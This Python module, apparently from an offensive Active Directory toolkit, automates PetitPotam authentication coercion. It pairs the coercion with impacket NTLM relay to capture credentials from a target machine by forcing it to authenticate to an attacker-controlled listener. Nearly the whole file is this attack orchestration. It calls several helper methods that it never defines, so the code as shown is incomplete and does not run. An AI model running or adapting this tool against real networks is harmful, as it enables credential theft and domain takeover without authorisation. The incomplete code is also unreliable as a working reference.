#!/usr/bin/env python3
"""
PetitPotam Module for AD-Automaton
Handles authentication coercion attacks using PetitPotam and related tools.
"""

import os
import time
import logging
import subprocess
from typing import List, Dict, Any, Optional, Tuple
from pathlib import Path

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Host, Credential
from executor import CommandExecutor
from logger import log_discovery, log_tool_execution, log_tool_result

class PetitPotamAttacker:
    """
    Handles authentication coercion attacks using PetitPotam and similar techniques.
    These attacks force authentication from target machines to attacker-controlled servers.
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the PetitPotam attacker.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        
        # Get tool configurations
        self.petitpotam_config = config.get('tools', {}).get('petitpotam', {})
        self.impacket_config = config.get('tools', {}).get('impacket', {})
        
        # Tool paths
        self.petitpotam_path = self.petitpotam_config.get('path', 'PetitPotam.py')
        self.ntlmrelayx_path = self.impacket_config.get('ntlmrelayx_path', 'impacket-ntlmrelayx')
        
        # Feature flag
        self.enabled = config.get('features', {}).get('enable_petitpotam', True)
        
        # Runtime state
        self.relay_process = None
        self.attack_duration = 300  # Default 5 minutes
    
    def run_petitpotam_attack(self, target_ip: str, listener_ip: str, 
                             relay_targets: Optional[List[str]] = None) -> List[Credential]:
        """
        Main method to run PetitPotam coercion attack.
        
        Args:
            target_ip: IP address of target to coerce
            listener_ip: IP address where attacker is listening
            relay_targets: Optional list of targets for NTLM relay
            
        Returns:
            List of captured/relayed credentials
        """
        if not self.enabled:
            self.logger.info("PetitPotam attacks are disabled in configuration")
            return []
        
        self.logger.info(f"Starting PetitPotam attack against {target_ip}")
        
        # OPSEC warning
        opsec_profile = self.config.get('opsec_profile', 'normal')
        if opsec_profile == 'stealth':
            self.logger.warning("PetitPotam attacks are noisy and may trigger alerts!")
        
        captured_data = []
        
        try:
            # Start NTLM relay if targets provided
            if relay_targets:
                self._start_ntlm_relay(relay_targets)
                time.sleep(3)  # Give relay time to start
            
            # Execute PetitPotam coercion
            success = self._execute_petitpotam(target_ip, listener_ip)
            
            if success:
                self.logger.info("PetitPotam coercion successful")
                
                # Wait for potential relayed authentication
                if relay_targets:
                    self.logger.info("Waiting for NTLM relay to capture authentication...")
                    time.sleep(30)  # Wait for relay
                    
                    # Parse relay results
                    captured_data = self._parse_relay_results()
            else:
                self.logger.warning("PetitPotam coercion may have failed")
            
            # Stop relay process
            if self.relay_process:
                self._stop_ntlm_relay()
            
        except KeyboardInterrupt:
            self.logger.info("PetitPotam attack interrupted by user")
            if self.relay_process:
                self._stop_ntlm_relay()
        except Exception as e:
            self.logger.error(f"PetitPotam attack failed: {e}")
            if self.relay_process:
                self._stop_ntlm_relay()
        
        log_discovery("credentials via PetitPotam", len(captured_data))
        
        return captured_data

def run_petitpotam_attack(db_manager: DatabaseManager, config: Dict[str, Any], 
                         target_ip: str, listener_ip: str, 
                         relay_targets: Optional[List[str]] = None) -> List[Credential]:
    """
    Main entry point for PetitPotam attacks.
    """
    attacker = PetitPotamAttacker(db_manager, config)
    return attacker.run_petitpotam_attack(target_ip, listener_ip, relay_targets)
